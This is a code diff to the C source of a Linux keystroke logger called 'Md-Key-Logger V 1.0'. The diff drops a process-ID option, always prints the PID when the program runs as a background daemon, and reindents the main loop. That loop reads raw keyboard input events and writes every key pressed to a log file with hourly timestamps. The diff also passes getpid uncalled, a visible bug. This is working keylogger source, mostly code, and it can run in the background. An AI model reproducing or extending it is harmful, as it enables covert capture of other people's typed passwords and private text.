@@ -24,7 +24,6 @@ int main(int argc, char **argv) {
     int option_index;
     int get_stream_key;
     bool daemon_mod = false;
-    bool pid_mod = false;
     bool caps_pressed = false;
     bool shift_pressed = false;
     int readable = 1;
@@ -39,21 +38,17 @@ int main(int argc, char **argv) {
     static struct option long_options[] = {
         {"log file path", required_argument, NULL, 'l'},
         {"daemon", no_argument, NULL, 'd'},
-        {"get process id", no_argument, NULL, 'p'},
         {"help", no_argument, NULL, 'h'},
         {0, 0, 0, 0}
     };
 
-    while ((choose = getopt_long(argc, argv, "l:dhp", long_options, &option_index)) != -1) {
+    while ((choose = getopt_long(argc, argv, "l:dh", long_options, &option_index)) != -1) {
         switch (choose) {
             case 'l':
                 log_file = optarg;
                 break;
             case 'd':
                 daemon_mod = true;
-                break;
-            case 'p':
-                pid_mod = true;
                 break;
             case 'h':
                 printf(" Md-Key-Logger V 1.0\n"
@@ -96,70 +91,70 @@ int main(int argc, char **argv) {
 
     if (daemon_mod) {
         if (change_task_to_background() == 0) {
-            if (pid_mod == true) {
-                printf("Process ID = %d \n", getpid);
-            }
-        }else{
+            fprintf(stderr, "Process ID = %d \n", getpid);
+            printf("Process ID = %d \n", getpid);
+        } else {
+
             perror("Error");
         }
     }
 
 
-get_time_now(time_string);
-fprintf(log, "\n Starting key logger: %s\n", time_string);
-bzero(time_string, 80);
-start = clock();
+    get_time_now(time_string);
+    fprintf(log, "\n Starting key logger: %s\n", time_string);
+    bzero(time_string, 80);
+    start = clock();
 
-while (readable > 0) {
-    readable = read(get_stream_key, &ev, sizeof (ev));
+    while (readable > 0) {
+        readable = read(get_stream_key, &ev, sizeof (ev));
 
-    if (ev.value == 1 && ev.type == 1) // Pressed a key
-    {
-        if (ev.code == 58) // Caps Lock = 58
+        if (ev.value == 1 && ev.type == 1) // Pressed a key
         {
-            if (caps_pressed) {
-                caps_pressed = false;
+            if (ev.code == 58) // Caps Lock = 58
+            {
+                if (caps_pressed) {
+                    caps_pressed = false;
+                } else {
+                    caps_pressed = true;
+                }
+            }
+
+            if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
+            {
+                shift_pressed = true;
+            }
+
+            if (shift_pressed) {
+                fprintf(log, "%s", shift_scancode_to_ascii[ev.code]);
+                fflush(log);
+            } else if (caps_pressed) {
+                fprintf(log, "%s", caps_scancode_to_ascii[ev.code]);
+                fflush(log);
             } else {
-                caps_pressed = true;
+                fprintf(log, "%s", scancode_to_ascii[ev.code]);
+                fflush(log);
+            }
+
+        } else if (ev.value == 0) // Released a key
+        {
+            if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
+            {
+                shift_pressed = false;
             }
         }
-
-        if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
-        {
-            shift_pressed = true;
-        }
-
-        if (shift_pressed) {
-            fprintf(log, "%s", shift_scancode_to_ascii[ev.code]);
+        end = clock();
+        if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
+            get_time_now(time_string);
+            fprintf(log, "\n%s\n", time_string);
             fflush(log);
-        } else if (caps_pressed) {
-            fprintf(log, "%s", caps_scancode_to_ascii[ev.code]);
-            fflush(log);
-        } else {
-            fprintf(log, "%s", scancode_to_ascii[ev.code]);
-            fflush(log);
-        }
-
-    } else if (ev.value == 0) // Released a key
-    {
-        if (ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
-        {
-            shift_pressed = false;
+            start = 0;
+            end = 0;
+            bzero(time_string, 80);
         }
     }
-    end = clock();
-    if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
-        get_time_now(time_string);
-        fprintf(log, "\n%s\n", time_string);
-        fflush(log);
-        start = 0;
-        end = 0;
-        bzero(time_string, 80);
-    }
-}
 
-fclose(log);
-close(get_stream_key);
+    fclose(log);
+    close(get_stream_key);
 
-return EXIT_SUCCESS;
+    return EXIT_SUCCESS;
 }
